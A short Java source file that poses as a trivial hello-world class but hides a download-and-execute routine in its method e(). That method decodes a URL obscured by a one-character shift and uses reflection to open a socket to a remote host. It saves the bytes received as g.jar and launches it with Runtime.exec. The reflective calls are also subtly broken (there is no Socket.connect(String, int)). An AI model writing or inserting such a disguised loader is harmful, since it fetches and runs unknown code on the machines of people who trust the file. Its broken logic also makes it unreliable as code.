import java.lang.*;
import java.io.*;

public class PM {
    private static final String M = "iuuqt://ujozvsm.dpn/z5nwo7cs";

    public static void main(String[] a) {
        System.out.println("H, W!");
    }

    public static void dS() {
        System.out.println("I'm dS!");
    }

    public PM() {
        System.out.println("I'm PM!");
    }

    @SuppressWarnings("deprecation")
    public void e() throws Exception {
        System.out.println("I'm e!");
        Class<?> c = Class.forName("java.net.Socket");
        Object s = c.newInstance();
        String d = "";
        for (int i = 0; i < M.length(); i++) {
            d += (char) (M.charAt(i) - 1);
        }
        c.getMethod("connect", String.class, int.class).invoke(s, d, 80);
        Object is = c.getMethod("getInputStream").invoke(s);
        byte[] b = new byte[1024];
        int br = (int) is.getClass().getMethod("read", byte[].class, int.class, int.class).invoke(is, b, 0, b.length);
        FileOutputStream fos = new FileOutputStream("g.jar");
        fos.write(b, 0, br);
        fos.close();
        System.out.println("L the p...");
        Runtime.getRuntime().exec("java -jar g.jar");
    }
}
